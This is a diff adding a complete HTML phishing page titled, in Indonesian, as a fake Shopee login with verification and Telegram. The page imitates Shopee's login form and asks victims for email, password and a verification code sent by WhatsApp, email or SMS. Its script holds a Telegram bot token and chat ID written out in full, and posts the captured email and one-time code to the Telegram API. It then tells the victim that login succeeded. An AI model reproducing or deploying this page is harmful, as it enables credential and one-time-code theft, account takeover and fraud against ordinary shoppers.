@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Login Shopee Palsu dengan Verifikasi dan Telegram</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f2f2f2;
+    padding: 20px;
+  }
+  .login-container {
+    max-width: 400px;
+    margin: auto;
+    background: #fff;
+    padding: 30px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  }
+  h2 {
+    text-align: center;
+    margin-bottom: 20px;
+    color: #333;
+  }
+  label {
+    display: block;
+    margin-top: 10px;
+  }
+  input[type="text"], input[type="email"], input[type="password"] {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+  }
+  .verif-section {
+    margin-top: 20px;
+    display: none;
+  }
+  .verif-method {
+    margin-top: 10px;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 20px;
+    background-color: #ff4646;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #e03e3e;
+  }
+</style>
+<script>
+  const telegramBotToken = '8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M';
+  const chatId = '5116335881';
+
+  function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    }).then(response => response.json())
+      .then(data => {
+        console.log('Pesan terkirim:', data);
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+  }
+
+  function pilihVerifikasi(method) {
+    document.getElementById('verif-section').style.display = 'block';
+    document.getElementById('verif-method-label').innerText = 'Masukkan kode dari ' + method;
+  }
+
+  function submitLogin() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const kodeVerif = document.getElementById('kode-verifikasi').value;
+    const metode = document.getElementById('verif-method-select').value;
+
+    if (!email || !password || !metode || !kodeVerif) {
+      alert('Harap lengkapi semua kolom!');
+      return;
+    }
+
+    // Kirim pesan ke Telegram
+    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${metode}\nKode: ${kodeVerif}`;
+    sendTelegramMessage(pesan);
+
+    alert('Verifikasi berhasil! Anda masuk.');
+  }
+</script>
+</head>
+<body>
+
+<div class="login-container">
+  <h2>Login Shopee</h2>
+  <form onsubmit="event.preventDefault(); submitLogin();">
+    <label for="email">Email:</label>
+    <input type="email" id="email" required />
+
+    <label for="password">Password:</label>
+    <input type="password" id="password" required />
+
+    <div class="verif-method">
+      <label for="verif-method">Pilih metode verifikasi:</label>
+      <select id="verif-method-select" onchange="pilihVerifikasi(this.value)">
+        <option value="">--Pilih metode--</option>
+        <option value="WhatsApp">WhatsApp</option>
+        <option value="Email">Email</option>
+        <option value="SMS">SMS</option>
+      </select>
+    </div>
+
+    <div class="verif-section" id="verif-section">
+      <label id="verif-method-label"></label>
+      <input type="text" id="kode-verifikasi" placeholder="Masukkan kode" required />
+    </div>
+
+    <button type="submit">Login</button>
+  </form>
+</div>
+
+</body>
+</html>
